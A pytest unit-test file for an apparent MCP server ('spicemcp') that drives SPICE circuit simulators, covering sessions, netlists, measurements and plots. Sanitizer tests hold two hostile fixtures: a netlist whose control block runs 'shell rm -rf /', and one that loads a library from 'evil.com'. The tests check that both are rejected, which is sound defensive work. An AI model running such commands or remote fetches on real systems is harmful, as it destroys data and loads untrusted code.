"""Unit tests for tool handlers (no Docker required)."""

from __future__ import annotations

import pytest

import spicemcp._globals as _globals
from spicemcp.config import SpiceMCPConfig
from spicemcp.core.session_manager import SessionManager
from spicemcp.tools.measure import measure_signal
from spicemcp.tools.models import list_models
from spicemcp.tools.netlist import modify_netlist, write_netlist
from spicemcp.tools.plot import plot_signals
from spicemcp.tools.session import cleanup_session, create_session, list_sessions
from spicemcp.tools.simulate import simulate

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def fresh_globals():
    """Give every test its own SessionManager and reset globals afterward."""
    _globals.config = SpiceMCPConfig()
    _globals.manager = SessionManager(ttl_minutes=10, max_sessions=5, reaper_interval=9999)
    yield
    _globals.manager.stop()
    _globals.config = None
    _globals.manager = None


# ---------------------------------------------------------------------------
# create_session
# ---------------------------------------------------------------------------


def test_create_session_ltspice():
    r = create_session("ltspice")
    assert r["error"] is None
    assert r["status"] == "created"
    assert r["simulator"] == "ltspice"
    assert isinstance(r["session_id"], str) and len(r["session_id"]) == 12
    assert r["expires_in_minutes"] == 10


def test_create_session_ngspice():
    r = create_session("ngspice")
    assert r["error"] is None
    assert r["simulator"] == "ngspice"


def test_create_session_unknown_simulator():
    r = create_session("qspice")
    assert r["error"] is not None
    assert "qspice" in r["error"]
    assert r["session_id"] is None


def test_create_session_max_sessions_enforced():
    # Fill to max
    for _ in range(5):
        r = create_session("ltspice")
        assert r["error"] is None
    # 6th should fail
    r = create_session("ltspice")
    assert r["error"] is not None
    assert "Maximum" in r["error"]
    assert r["session_id"] is None


# ---------------------------------------------------------------------------
# list_sessions
# ---------------------------------------------------------------------------


def test_list_sessions_empty():
    r = list_sessions()
    assert r["sessions"] == []
    assert r["total_sessions"] == 0
    assert r["total_raw_mb"] == 0.0


def test_list_sessions_after_create():
    create_session("ltspice")
    create_session("ngspice")
    r = list_sessions()
    assert r["total_sessions"] == 2
    simulators = {s["simulator"] for s in r["sessions"]}
    assert simulators == {"ltspice", "ngspice"}


def test_list_sessions_fields():
    r_create = create_session("ltspice")
    sid = r_create["session_id"]
    r = list_sessions()
    assert len(r["sessions"]) == 1
    s = r["sessions"][0]
    assert s["session_id"] == sid
    assert s["status"] == "created"
    assert s["domain"] is None
    assert isinstance(s["expires_in_seconds"], int) and s["expires_in_seconds"] > 0
    assert s["has_raw_file"] is False
    assert s["has_meas_results"] is False
    assert s["simulation_required"] is False


# ---------------------------------------------------------------------------
# cleanup_session
# ---------------------------------------------------------------------------


def test_cleanup_session_not_found_is_idempotent():
    r = cleanup_session("nonexistent123")
    assert r["error"] is None
    assert r["session_status"] == "not_found"
    assert r["freed_mb"] == 0.0


def test_cleanup_session_cleans_raw_file(tmp_path):
    r_create = create_session("ltspice")
    sid = r_create["session_id"]
    session = _globals.manager.get_session(sid)

    # Manually plant a fake raw file
    raw = session.work_dir / "circuit.raw"
    raw.write_bytes(b"X" * 1024)
    session.raw_path = raw
    session.raw_file_size_mb = 1024 / (1024 * 1024)

    r = cleanup_session(sid, keep_log=True, delete_session=False)
    assert r["error"] is None
    assert r["session_status"] == "cleaned"
    assert not raw.exists()


def test_cleanup_session_delete():
    r_create = create_session("ltspice")
    sid = r_create["session_id"]

    r = cleanup_session(sid, delete_session=True)
    assert r["session_status"] == "deleted"
    # Session should be gone
    assert _globals.manager.get_session(sid) is None


# ---------------------------------------------------------------------------
# write_netlist
# ---------------------------------------------------------------------------

VALID_NETLIST = (
    "* RC filter\nV1 in 0 PULSE(0 5 0 10n 10n 500n 1u)\nR1 in out 1k\nC1 out 0 1n\n.tran 5u\n.end\n"
)

MALICIOUS_NETLIST = "* Malicious\n.control\nshell rm -rf /\n.endc\n.end\n"


def test_write_netlist_session_not_found():
    r = write_netlist("badid123456", VALID_NETLIST)
    assert r["error"] is not None
    assert "not found" in r["error"]
    assert r["accepted"] is False


def test_write_netlist_accepted():
    r_create = create_session("ltspice")
    sid = r_create["session_id"]

    r = write_netlist(sid, VALID_NETLIST)
    assert r["error"] is None
    assert r["accepted"] is True
    assert r["violations"] == []

    # Netlist file should exist in work_dir
    session = _globals.manager.get_session(sid)
    assert session.netlist_path is not None
    assert session.netlist_path.exists()
    assert session.simulation_required is True


def test_write_netlist_custom_filename():
    r_create = create_session("ngspice")
    sid = r_create["session_id"]

    r = write_netlist(sid, VALID_NETLIST, filename="filter.net")
    assert r["accepted"] is True
    assert r["filename"] == "filter.net"
    session = _globals.manager.get_session(sid)
    assert session.netlist_path.name == "filter.net"


def test_write_netlist_sanitizer_rejection():
    r_create = create_session("ngspice")
    sid = r_create["session_id"]

    r = write_netlist(sid, MALICIOUS_NETLIST)
    assert r["accepted"] is False
    assert r["error"] is None
    assert len(r["violations"]) >= 1
    assert r["violations"][0]["type"] == "CONTROL_BLOCK"


def test_write_netlist_violation_fields():
    r_create = create_session("ngspice")
    sid = r_create["session_id"]

    r = write_netlist(sid, MALICIOUS_NETLIST)
    v = r["violations"][0]
    assert "line" in v
    assert "type" in v
    assert "content" in v
    assert "fix" in v


def test_write_netlist_lib_url_rejected():
    r_create = create_session("ltspice")
    sid = r_create["session_id"]
    netlist = "* test\n.lib http://evil.com/bad.lib\n.end\n"
    r = write_netlist(sid, netlist)
    assert r["accepted"] is False
    assert any(v["type"] == "LIB_URL" for v in r["violations"])


def test_write_netlist_overwrites_previous():
    r_create = create_session("ltspice")
    sid = r_create["session_id"]

    write_netlist(sid, VALID_NETLIST, filename="v1.net")
    write_netlist(sid, VALID_NETLIST, filename="v2.net")

    session = _globals.manager.get_session(sid)
    assert session.netlist_path.name == "v2.net"


# ---------------------------------------------------------------------------
# simulate — error path only (no Docker)
# ---------------------------------------------------------------------------


def test_simulate_session_not_found():
    r = simulate("nonexistent000")
    assert r["error"] is not None
    assert "not found" in r["error"]
    assert r["status"] is None


def test_simulate_no_netlist():
    r_create = create_session("ltspice")
    sid = r_create["session_id"]
    # Session created but no netlist written
    r = simulate(sid)
    assert r["error"] is not None
    assert "no netlist" in r["error"].lower()
    assert r["status"] is None


def test_simulate_timeout_capped_at_600():
    """timeout_s > 600 should be silently capped - verified via simulate error path."""
    r_create = create_session("ltspice")
    sid = r_create["session_id"]
    # No netlist, so we get the 'no netlist' error before simulation runs.
    # This just confirms the function accepts large timeout_s without raising.
    r = simulate(sid, timeout_s=9999)
    assert r["error"] is not None  # 'no netlist' error, not a crash


# ---------------------------------------------------------------------------
# measure_signal
# ---------------------------------------------------------------------------


def _seed_session_with_raw(simulator: str, raw_path):
    """Helper: create a session and attach a synthetic raw file to it."""
    from spicemcp.core.analysis_engine import detect_domain, list_signals

    r = create_session(simulator)
    sid = r["session_id"]
    session = _globals.manager.get_session(sid)
    session.raw_path = raw_path
    session.domain = detect_domain(raw_path)
    session.signals_available = list_signals(raw_path)
    session.raw_file_size_mb = raw_path.stat().st_size / (1024 * 1024)
    session.simulation_required = False
    session.status = "completed"
    return sid


def test_measure_session_not_found():
    r = measure_signal("nonexistent000", [{"signal": "V(out)", "operation": "stats"}])
    assert r["error"] is not None
    assert r["results"] == []


def test_measure_no_raw():
    sid = create_session("ltspice")["session_id"]
    r = measure_signal(sid, [{"signal": "V(out)", "operation": "stats"}])
    assert r["error"] is not None
    assert "no raw file" in r["error"].lower()


def test_measure_signal_unknown(tran_raw):
    sid = _seed_session_with_raw("ltspice", tran_raw)
    r = measure_signal(sid, [{"signal": "V(missing)", "operation": "stats"}])
    assert r["error"] is not None
    assert "V(missing)" in r["error"]


def test_measure_tran_stats(tran_raw):
    sid = _seed_session_with_raw("ltspice", tran_raw)
    r = measure_signal(sid, [{"signal": "V(out)", "operation": "stats"}])
    assert r["error"] is None
    assert len(r["results"]) == 1
    out = r["results"][0]
    assert out["operation"] == "stats"
    assert out["domain"] == "tran"
    assert out["signal"] == "V(out)"
    assert "mean_dc" in out
    assert abs(out["peak_to_peak"] - 2.0) < 0.01


def test_measure_tran_crossing_with_n(tran_raw):
    """1kHz sine, 10ms duration -> 10 zero crossings each direction."""
    sid = _seed_session_with_raw("ltspice", tran_raw)
    r = measure_signal(
        sid,
        [
            {
                "signal": "V(out)",
                "operation": "crossing",
                "threshold": 0.0,
                "edge": "rising",
                "n": 1,
            },
            {
                "signal": "V(out)",
                "operation": "crossing",
                "threshold": 0.0,
                "edge": "rising",
                "n": 3,
            },
        ],
    )
    assert r["error"] is None
    r1, r3 = r["results"]
    assert r1["found"] is True
    assert r3["found"] is True
    assert r3["x"] > r1["x"]


def test_measure_power(tran_raw):
    sid = _seed_session_with_raw("ltspice", tran_raw)
    r = measure_signal(
        sid,
        [{"operation": "power", "signals": ["V(out)", "I(R1)"]}],
    )
    assert r["error"] is None
    out = r["results"][0]
    assert out["operation"] == "power"
    assert out["v_signal"] == "V(out)"
    assert out["i_signal"] == "I(R1)"
    # P = V*I = sin^2(...)/1k, mean = 1/(2k) = 0.0005
    assert abs(out["mean_power"] - 0.0005) < 1e-4


def test_measure_ac_stats(ac_raw):
    sid = _seed_session_with_raw("ltspice", ac_raw)
    r = measure_signal(sid, [{"signal": "V(out)", "operation": "stats"}])
    assert r["error"] is None
    out = r["results"][0]
    assert out["domain"] == "ac"
    assert "bandwidth_3db" in out
    assert "gain_db_at_end" in out


def test_measure_batch_ordering(tran_raw):
    sid = _seed_session_with_raw("ltspice", tran_raw)
    r = measure_signal(
        sid,
        [
            {"signal": "V(out)", "operation": "stats"},
            {"signal": "I(R1)", "operation": "stats"},
            {"signal": "V(out)", "operation": "crossing", "threshold": 0.0},
        ],
    )
    assert r["error"] is None
    assert len(r["results"]) == 3
    assert r["results"][0]["signal"] == "V(out)"
    assert r["results"][1]["signal"] == "I(R1)"
    assert r["results"][2]["operation"] == "crossing"


def test_measure_blocks_when_simulation_required(tran_raw):
    sid = _seed_session_with_raw("ltspice", tran_raw)
    _globals.manager.get_session(sid).simulation_required = True
    r = measure_signal(sid, [{"signal": "V(out)", "operation": "stats"}])
    assert r["error"] is not None
    assert "simulate" in r["error"].lower()


# ---------------------------------------------------------------------------
# plot_signals
# ---------------------------------------------------------------------------


def test_plot_session_not_found():
    r = plot_signals("nonexistent000", ["V(out)"])
    assert r["error"] is not None


def test_plot_too_many_signals(tran_raw):
    sid = _seed_session_with_raw("ltspice", tran_raw)
    r = plot_signals(sid, ["V(out)"] * 7)
    assert r["error"] is not None
    assert "Maximum 6" in r["error"]


def test_plot_invalid_format(tran_raw):
    sid = _seed_session_with_raw("ltspice", tran_raw)
    r = plot_signals(sid, ["V(out)"], format="svg")
    assert r["error"] is not None
    assert "format" in r["error"].lower()


def test_plot_unknown_signal(tran_raw):
    sid = _seed_session_with_raw("ltspice", tran_raw)
    r = plot_signals(sid, ["V(does_not_exist)"])
    assert r["error"] is not None


def test_plot_tran_png(tran_raw):
    sid = _seed_session_with_raw("ltspice", tran_raw)
    r = plot_signals(sid, ["V(out)", "I(R1)"], title="RC test", format="png")
    assert r["error"] is None
    assert r["domain"] == "tran"
    assert r["image_uri"] is not None
    assert r["image_uri"].startswith("file://")
    assert r["image_size_kb"] > 1.0


def test_plot_ac_bode_png(ac_raw):
    sid = _seed_session_with_raw("ltspice", ac_raw)
    r = plot_signals(sid, ["V(out)"], title="RC Bode", format="png")
    assert r["error"] is None
    assert r["domain"] == "ac"
    assert r["image_uri"] is not None


# ---------------------------------------------------------------------------
# modify_netlist
# ---------------------------------------------------------------------------


MODIFY_NETLIST = (
    "* Buck stub\n.param Vdd=3.3\nV1 in 0 {Vdd}\nR1 in out 10k\nC1 out 0 1n\n.tran 5u\n.end\n"
)


def test_modify_session_not_found():
    r = modify_netlist("nonexistent000", [{"type": "component", "ref": "R1", "value": "1k"}])
    assert r["error"] is not None
    assert r["applied"] == []


def test_modify_no_netlist():
    sid = create_session("ltspice")["session_id"]
    r = modify_netlist(sid, [{"type": "component", "ref": "R1", "value": "1k"}])
    assert r["error"] is not None
    assert "no netlist" in r["error"].lower()


def test_modify_component_value():
    sid = create_session("ltspice")["session_id"]
    write_netlist(sid, MODIFY_NETLIST)
    # mark sim done so we can test simulation_required toggle later
    s = _globals.manager.get_session(sid)
    s.simulation_required = False

    r = modify_netlist(sid, [{"type": "component", "ref": "R1", "value": "4.7k"}])
    assert r["error"] is None
    assert len(r["applied"]) == 1
    assert r["applied"][0]["ref"] == "R1"
    assert r["applied"][0]["new_value"] == "4.7k"
    assert r["simulation_required"] is True

    # File reflects the change
    text = s.netlist_path.read_text()
    assert "4.7k" in text


def test_modify_component_not_found():
    sid = create_session("ltspice")["session_id"]
    write_netlist(sid, MODIFY_NETLIST)
    r = modify_netlist(sid, [{"type": "component", "ref": "R99", "value": "1k"}])
    assert r["error"] is None
    assert len(r["failed"]) == 1
    assert r["failed"][0]["ref"] == "R99"


def test_modify_parameter():
    sid = create_session("ltspice")["session_id"]
    write_netlist(sid, MODIFY_NETLIST)
    r = modify_netlist(sid, [{"type": "parameter", "ref": "Vdd", "value": "5"}])
    assert r["error"] is None
    assert len(r["applied"]) == 1
    assert r["applied"][0]["new_value"] == "5"


def test_modify_instruction_add_then_remove():
    sid = create_session("ltspice")["session_id"]
    write_netlist(sid, MODIFY_NETLIST)
    r = modify_netlist(
        sid,
        [{"type": "instruction", "ref": ".ic V(out)=0", "action": "add"}],
    )
    assert r["error"] is None
    assert len(r["applied"]) == 1
    s = _globals.manager.get_session(sid)
    assert ".ic V(out)=0" in s.netlist_path.read_text()

    r = modify_netlist(
        sid,
        [{"type": "instruction", "ref": ".ic V(out)=0", "action": "remove"}],
    )
    assert r["error"] is None
    assert len(r["applied"]) == 1


def test_modify_invalidates_results():
    """After modify_netlist the session must require re-simulation."""
    sid = create_session("ltspice")["session_id"]
    write_netlist(sid, MODIFY_NETLIST)
    s = _globals.manager.get_session(sid)
    # Simulate fake completion
    s.simulation_required = False
    s.raw_path = s.work_dir / "fake.raw"
    s.raw_path.write_bytes(b"X" * 1024)
    s.raw_file_size_mb = 1024 / (1024 * 1024)

    modify_netlist(sid, [{"type": "component", "ref": "R1", "value": "2k"}])
    assert s.simulation_required is True
    assert s.raw_path is None  # stale results cleared


def test_modify_partial_success():
    """Mix of valid and invalid changes: applied/failed both populated."""
    sid = create_session("ltspice")["session_id"]
    write_netlist(sid, MODIFY_NETLIST)
    r = modify_netlist(
        sid,
        [
            {"type": "component", "ref": "R1", "value": "1k"},
            {"type": "component", "ref": "R99", "value": "2k"},
        ],
    )
    assert len(r["applied"]) == 1
    assert len(r["failed"]) == 1
    assert r["applied"][0]["ref"] == "R1"
    assert r["failed"][0]["ref"] == "R99"


# ---------------------------------------------------------------------------
# list_models
# ---------------------------------------------------------------------------


def test_list_models_no_dirs_configured():
    r = list_models("anything")
    assert r["matches"] == []
    assert r["total_matches"] == 0
    assert "model_dirs" in r["note"]


def test_list_models_finds_local_files(tmp_path):
    # Set up a fake model dir
    model_dir = tmp_path / "models"
    model_dir.mkdir()
    (model_dir / "TPS54360.lib").write_text("* fake\n")
    (model_dir / "TPS54360_TRANS.lib").write_text("* fake\n")
    (model_dir / "BAT54.sub").write_text("* fake\n")
    (model_dir / "notes.txt").write_text("ignore me")

    _globals.config = SpiceMCPConfig(model_dirs=[model_dir])

    r = list_models("TPS")
    assert r["error"] is None if "error" in r else True  # contract has no 'error' field
    assert r["total_matches"] == 2
    names = {m["name"] for m in r["matches"]}
    assert "TPS54360.lib" in names
    assert "TPS54360_TRANS.lib" in names
    assert all(m["source"] == "user_0" for m in r["matches"])


def test_list_models_no_match_returns_similar(tmp_path):
    model_dir = tmp_path / "models"
    model_dir.mkdir()
    (model_dir / "LTC3780.lib").write_text("* fake\n")
    (model_dir / "LTC3789.lib").write_text("* fake\n")

    _globals.config = SpiceMCPConfig(model_dirs=[model_dir])
    r = list_models("LTC3781")
    assert r["matches"] == []
    assert "Similar" in r["note"] or "Check the filename" in r["note"]


def test_list_models_empty_search_returns_all(tmp_path):
    model_dir = tmp_path / "models"
    model_dir.mkdir()
    (model_dir / "a.lib").write_text("")
    (model_dir / "b.sub").write_text("")
    _globals.config = SpiceMCPConfig(model_dirs=[model_dir])
    r = list_models("")
    assert r["total_matches"] == 2
